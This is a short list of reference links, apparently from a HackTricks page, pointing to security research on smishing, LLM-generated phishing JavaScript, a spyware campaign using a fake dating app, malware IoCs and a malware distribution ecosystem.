- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
